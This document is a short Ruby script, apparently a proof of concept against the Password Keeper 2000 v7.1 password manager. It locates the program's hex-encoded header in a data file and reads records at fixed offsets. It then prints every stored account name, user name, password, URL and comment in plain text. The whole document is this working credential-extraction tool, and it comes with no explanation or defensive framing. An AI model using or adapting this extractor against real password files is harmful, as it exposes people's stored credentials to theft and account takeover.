#!/usr/bin/ruby
account, user_name, password, url, comment = "N/A", "N/A", "N/A", "N/A", "N/A"
pattern = "\x50\x61\x73\x73\x77\x6f\x72\x64\x20\x4b\x65\x65\x70\x65\x72\x20\x32\x30\x30\x30\x20\x76\x37\x2e\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\xa9\x20\x31\x39\x39\x36\x2d\x32\x30\x30\x38\x20\x62\x79\x20\x47\x72\x65\x67\x6f\x72\x79\x20\x42\x72\x61\x75\x6e\x2e\x20\x41\x6c\x6c\x20\x72\x69\x67\x68\x74\x73\x20\x72\x65\x73\x65\x72\x76\x65\x64\x2e"
file = File.open(ARGV[0])
variable=file.read 
offset=variable.index(pattern)+164+96
while !(account.empty? && user_name.empty? && password.empty? && url.empty? && comment.empty?)
  account = variable[offset,48].gsub(/\x00/,"")
  user_name = variable[offset+48,48].gsub(/\x00/,"")
  password = variable[offset+48+48,48].gsub(/\x00/,"")
  url = variable[offset+48+48+48,111].gsub(/\x00/,"")
  comment = variable[offset+48+48+48+111,769].gsub(/\x00/,"")
  if !(account.empty? && user_name.empty? && password.empty? && url.empty? && comment.empty?)
    puts "account : #{account}"
    puts "user name : #{user_name}"
    puts "password : #{password}"
    puts "url : #{url}"
    puts "comment : #{comment}"
    puts ""
    offset=offset+48+48+48+111+769
  end
end
